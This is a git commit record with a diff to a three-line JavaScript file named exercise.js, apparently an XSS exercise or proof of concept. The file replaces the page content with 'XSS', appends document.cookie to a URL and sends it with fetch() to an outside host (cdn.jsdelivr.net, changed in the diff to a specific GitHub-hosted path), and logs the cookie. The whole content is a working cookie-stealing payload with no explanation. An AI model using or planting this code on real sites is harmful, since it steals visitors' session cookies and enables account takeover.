5038ce91420acb409e6b75f7e06608619490f9f0
shaonsec <shaonsec@gmail.com>
2026-04-01 06:19:01 +0600

    Update exercise.js

--- exercise.js
+++ exercise.js
@@ -1,3 +1,3 @@
 document.body.innerHTML = "XSS";
-fetch("https://cdn.jsdelivr.net/" + document.cookie);
+fetch("https://cdn.jsdelivr.net/gh/shaonsec/exercise/exercise.js" + document.cookie);
 console.log(document.cookie);
